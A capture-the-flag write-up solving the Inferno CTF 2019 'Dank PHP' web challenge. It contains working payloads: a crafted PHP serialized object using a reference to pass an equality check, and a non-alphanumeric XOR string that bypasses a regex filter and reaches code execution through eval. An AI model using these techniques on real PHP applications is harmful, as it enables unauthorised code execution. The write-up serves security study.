<h1>Inferno CTF 2019 â€“ Dank PHP</h1>

<ul>
<li><strong>Category:</strong> Web</li>
<li><strong>Points:</strong> 375</li>
</ul>

<h2>Challenge</h2>

<blockquote>
  <p>I love Dank Memes+PHP</p>
  
  <p>Link: http://104.197.168.32:17010/</p>
  
  <p>Author : MrT4ntr4</p>
</blockquote>

<h2>Solution</h2>

<p>The website will show its own source code.</p>

<p>```php
<?php
include "flag.php";</p>

<p>show_source(<strong>FILE</strong>);</p>

<p>class user {
  var $name;
  var $pass;
  var $secret;
}</p>

<p>if (isset($_GET['id'])) {</p>

<p>$id = $_GET['id'];</p>

<p>$usr = unserialize($id);
  if ($usr) {
    $usr->secret = $flag1;
    if ($usr->name === "admin" &amp;&amp; $usr->pass === $usr->secret) {
      echo "Congratulation! Here is something for you...  " . $usr->pass;
      if (isset($<em>GET['caption'])) {
        $cap = $</em>GET['caption'];
        if (strlen($cap) &gt; 45) {
          die("Naaaah, Take rest now");
        }
        if (preg_match("/[A-Za-z0-9]+/", $cap)) {
          die("Don't mess with the best language!!");
        }
        eval($cap);
        // Try to execute echoFlag()
      } else {
        echo "NVM You are not eligible";
      }
    } else {
      echo "Oh no... You can't fool me";
    }</p>

<p>} else {
    echo "are you trolling?";
  }</p>

<p>} else {
  echo "Go and watch some Youthoob Tutorials Kidosss!!";
}
```</p>

<p>You have to bypass some checks in order to get the flag. The first part of the flag, i.e. <code>$flag1</code>, is printed after the first check, the second part of the flag can be obtained executing <code>echoFlag()</code> method when the <code>eval($cap)</code> instruction is reached.</p>

<p>First of all you have to replicate a serialized input to pass via <code>id</code> HTTP GET parameter. This could be done with the following code.</p>

<p>```php
<?php
class user {
  var $name;
  var $pass;
  var $secret;
}</p>

<p>$usr = new user();
$usr->name = "name";
$usr->pass = "pass";
$usr->secret = "secret";</p>

<p>$id = serialize($usr);
echo $id;
```</p>

<p>The result is the following payload.</p>

<p><code>
O:4:"user":3:{s:4:"name";s:5:"admin";s:4:"pass";s:4:"pass";s:6:"secret";s:6:"secret";}
</code></p>

<p>The first check to bypass is the following.</p>

<p><code>php
    $usr-&gt;secret = $flag1;
    if ($usr-&gt;name === "admin" &amp;&amp; $usr-&gt;pass === $usr-&gt;secret) {
</code></p>

<p>This can be achieved referencing <code>$usr-&gt;secret</code> field from the <code>$usr-&gt;pass</code> field, so when the assign operation with <code>$flag1</code> will be performed, both fields will be equals.</p>

<p>In PHP serialization, this can be done with the <code>R</code> clause, pointing to the index of the referenced object. The crafted payload is the following.</p>

<p><code>
O:4:"user":3:{s:4:"name";s:5:"admin";s:6:"secret";s:6:"secret";s:4:"pass";R:3;}
</code></p>

<p>The complete URL is the following.</p>

<p><code>
http://104.197.168.32:17010/?id=O:4:%22user%22:3:{s:4:%22name%22;s:5:%22admin%22;s:6:%22secret%22;s:6:%22secret%22;s:4:%22pass%22;R:3;}
</code></p>

<p>The answer will be the following.</p>

<p><code>
Congratulation! Here is something for you...
infernoCTF{pHp_1s_
NVM You are not eligible
</code></p>

<p>The second check to bypass is the following.</p>

<p><code>php
      if (isset($_GET['caption'])) {
        $cap = $_GET['caption'];
        if (strlen($cap) &gt; 45) {
          die("Naaaah, Take rest now");
        }
        if (preg_match("/[A-Za-z0-9]+/", $cap)) {
          die("Don't mess with the best language!!");
        }
        eval($cap);
        // Try to execute echoFlag()
</code></p>

<p>This is quite hard, because there are two strong constraints.</p>

<p>Usually, <code>preg_match</code> <a href="https://bugs.php.net/bug.php?id=69274">can be bypassed using arrays</a>, but in this case I was not able to use the content of the array into the <code>eval</code> instruction.</p>

<p>Googling around, I learned about a technique to bypass WAF using non-alfanumeric input, performing logic operations on non-alfanumeric chars using non-alfanumeric variables.</p>

<p>Considering the check on the length, and the overhead of this kind of payloads, probably the best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. <code>_</code>.</p>

<p>I found two interesting websites:
* <a href="https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/">Bypass WAF - Php webshell without numbers and letters</a>;
* <a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php/#preg_match-code-execution"><code>preg_match</code> Code Execution</a>.</p>

<p>In the second website, there is the same scenario of the challenge, so I used it to craft my payload.</p>

<p>Using bitwise XOR operation in PHP, you can craft <code>_GET</code> string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.</p>

<p><code>php
$_="`{{{"^"?&lt;&gt;/"; // This is: "_GET" string.
</code></p>

<p>Then you can specify the execution of the content of a GET parameter with the following code.</p>

<p><code>php
${$_}[_]();       // This is $_GET[_]()
</code></p>

<p>So the complete payload that will be executed by the <code>eval</code> instruction will be the following.</p>

<p><code>php
$_="`{{{"^"?&lt;&gt;/";${$_}[_]();
</code></p>

<p>Putting everything together, you can craft the final URL to invoke. The last thing to do is to specify the HTTP GET parameter called <code>_</code> where the name of the function to call will be passed.</p>

<p><code>
http://104.197.168.32:17010/?id=O:4:%22user%22:3:{s:4:%22name%22;s:5:%22admin%22;s:6:%22secret%22;s:6:%22secret%22;s:4:%22pass%22;R:3;}&amp;caption=$_=%22`{{{%22^%22?%3C%3E/%22;${$_}[_]();&amp;_=echoFlag
</code></p>

<p>The web page will give the following answer.</p>

<p><code>
Congratulation! Here is something for you...
infernoCTF{pHp_1s_
a_h34dache}
</code></p>

<p>So the flag is the following.</p>

<p><code>
infernoCTF{pHp_1s_a_h34dache}
</code></p>
